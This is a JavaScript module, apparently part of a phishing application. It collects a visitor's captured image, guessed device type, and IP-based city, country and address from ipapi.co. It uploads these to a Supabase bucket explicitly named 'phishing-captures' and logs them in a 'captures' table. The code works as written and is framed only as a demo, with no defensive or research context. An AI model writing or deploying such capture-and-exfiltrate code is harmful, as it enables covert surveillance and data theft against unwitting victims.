import { createClient } from '@supabase/supabase-js';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

export const supabase = createClient(supabaseUrl, supabaseKey);

// Helper to get device model (Basic heuristic)
export const getDeviceInfo = () => {
  const ua = navigator.userAgent;
  if (/android/i.test(ua)) return "Android Device";
  if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "Apple iOS Device";
  return "Unknown Desktop/Laptop";
};

// Helper to get location via IP API (Free tier)
export const getLocation = async () => {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return { city: data.city, country: data.country_name, ip: data.ip };
  } catch (e) {
    return { city: 'Unknown', country: 'Unknown', ip: 'Local' };
  }
};

export const uploadData = async (uniqueId, imageSrc) => {
  const device = getDeviceInfo();
  const location = await getLocation();
  
  // 1. Upload Image to Storage
  const fileExt = imageSrc.split('.').pop();
  const fileName = `${Date.now()}.${fileExt}`;
  const filePath = `${uniqueId}/${fileName}`;

  const { data: uploadData, error: uploadError } = await supabase.storage
    .from('phishing-captures') // Create bucket named 'phishing-captures' first!
    .upload(filePath, imageSrc);

  if (uploadError) throw uploadError;

  // 2. Get Public URL
  const { data: { publicUrl } } = supabase.storage.from('phishing-captures').getPublicUrl(filePath);

  // 3. Save Metadata to DB
  const { error: dbError } = await supabase
    .from('captures')
    .insert([
      { 
        user_id: uniqueId, // Note: We use ID for simplicity in this demo, ideally map to User Profile ID
        image_url: publicUrl,
        device_model: device,
        location_city: location.city,
        location_country: location.country,
        ip_address: location.ip
      }
    ]);

  if (dbError) throw dbError;
};